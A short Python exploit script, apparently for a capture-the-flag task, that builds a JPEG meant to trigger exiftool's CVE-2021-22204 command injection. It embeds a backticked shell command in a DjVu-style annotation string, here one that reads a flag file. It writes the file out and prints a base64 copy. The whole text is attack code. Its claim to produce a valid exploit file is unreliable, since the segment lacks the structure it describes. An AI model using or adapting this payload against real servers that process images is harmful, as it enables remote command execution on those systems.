#!/usr/bin/env python3
"""
Generate malicious JPEG with exiftool RCE payload
CVE-2021-22204
"""

# Minimal valid JPEG with malicious EXIF
# This JPEG contains the exploit in the EXIF metadata

jpeg_header = bytes.fromhex('FFD8FFE0 00104A46 49460001 01000048 00480000')
jpeg_marker = bytes.fromhex('FFE1')  # APP1 marker for EXIF

# Malicious EXIF with DjVu ANT structure embedded
# The command will be executed when exiftool processes this
command = '(/usr/local/bin/readflag || cat /flag.txt) 2>&1'

exif_payload = f'''(metadata (Copyright "\\n" . `{command}` . "\\n"))'''.encode('utf-8')

# Build EXIF segment
exif_size = (len(exif_payload) + 2).to_bytes(2, 'big')
exif_segment = jpeg_marker + exif_size + exif_payload

# JPEG end marker
jpeg_end = bytes.fromhex('FFD9')

# Complete malicious JPEG
malicious_jpeg = jpeg_header + exif_segment + jpeg_end

# Write to file
with open('exploit.jpg', 'wb') as f:
    f.write(malicious_jpeg)

print(f"[+] Created exploit.jpg ({len(malicious_jpeg)} bytes)")
print(f"[+] Command: {command}")

# Print for payload.txt
print("\n[+] Base64 for embedding:")
import base64
print(base64.b64encode(malicious_jpeg).decode())
